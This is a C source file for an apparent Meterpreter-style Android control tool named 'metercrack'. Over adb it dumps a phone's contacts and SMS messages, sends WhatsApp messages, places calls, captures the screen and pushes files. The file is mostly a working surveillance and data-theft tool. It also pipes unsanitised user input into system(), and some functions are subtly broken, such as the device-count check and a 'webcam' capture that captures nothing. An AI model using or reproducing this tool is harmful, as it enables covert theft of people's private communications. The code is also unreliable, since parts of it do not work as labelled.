#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

void execute_adb_command(const char *command) {
    printf("Executing command: %s\n", command);
    int result = system(command);
    if (result != 0) {
        printf("Command execution failed!\n");
    }
}

void dump_contacts() {
    printf("Fetching contacts...\n");
    execute_adb_command("adb shell content query --uri content://contacts/phones/ --projection display_name:number > contacts_dump.txt");
    printf("Contacts saved at > contacts_dump.txt\n");
}

void dump_sms() {
    printf("Fetching SMS messages...\n");
    execute_adb_command("adb shell content query --uri content://sms/ --projection address:body > sms_dump.txt");
    printf("SMS messages saved at > sms_dump.txt\n");
}

void send_whatsapp_message(const char *destination, const char *text) {
    char command[512];
    snprintf(command, sizeof(command),
        "adb shell am start -a android.intent.action.SENDTO -d whatsapp:%s --es android.intent.extra.TEXT \"%s\"",
        destination, text);
    execute_adb_command(command);
    printf("WhatsApp message SENT!\n");
}

void handle_client() {
    // This function handles client connection
    printf("A CLIENT CONNECTED!\n");

    // Handle commands
    char command[256];
    while (1) {
        printf("metercrack > ");
        fgets(command, sizeof(command), stdin);

        // Remove trailing newline from input command
        command[strcspn(command, "\n")] = 0;

        if (strcmp(command, "dump_contacts") == 0) {
            dump_contacts();
        } else if (strcmp(command, "dump_sms") == 0) {
            dump_sms();
        } else if (strncmp(command, "send -d", 7) == 0) {
            char destination[50], text[200];
            sscanf(command, "send -d %s -t \"%[^\"]", destination, text);
            send_whatsapp_message(destination, text);
        } else if (strncmp(command, "call -d", 7) == 0) {
            char destination[50];
            sscanf(command, "call -d %s", destination);
            char call_command[256];
            snprintf(call_command, sizeof(call_command), "adb shell am start -a android.intent.action.CALL -d tel:%s", destination);
            execute_adb_command(call_command);
        } else if (strcmp(command, "screen_snap") == 0) {
            execute_adb_command("adb shell screencap -p /sdcard/screen_snap.png");
            execute_adb_command("adb pull /sdcard/screen_snap.png ./screen_snap.png");
            printf("Screen captured and saved as screen_snap.png\n");
        } else if (strcmp(command, "webcam_snap") == 0) {
            execute_adb_command("adb shell am start -a android.intent.action.MEDIA_SCANNER_SCAN_FILE -d file:///sdcard/webcam_snap.png");
            execute_adb_command("adb pull /sdcard/webcam_snap.png ./webcam_snap.png");
            printf("Webcam snapshot captured and saved as webcam_snap.png\n");
        } else if (strncmp(command, "upload file -d", 14) == 0) {
            char file_path[200];
            sscanf(command, "upload file -d %s", file_path);
            char upload_command[256];
            snprintf(upload_command, sizeof(upload_command), "adb push %s /sdcard/", file_path);
            execute_adb_command(upload_command);
            printf("File uploaded to device at /sdcard/\n");
        } else if (strcmp(command, "webcam_list") == 0) {
            execute_adb_command("adb shell ls /dev/video*");
        } else {
            printf("Unknown command\n");
        }
    }
}

int main() {
    printf("Starting TCP HANDLER in Android mode...\n");

    // Checking if devices are connected
    int connected_devices = system("adb devices | grep -w 'device' | wc -l");
    if (connected_devices <= 0) {
        printf("No Android devices connected!\n");
        return 1;
    }

    printf("Android device connected.\n");

    handle_client();

    return 0;
}
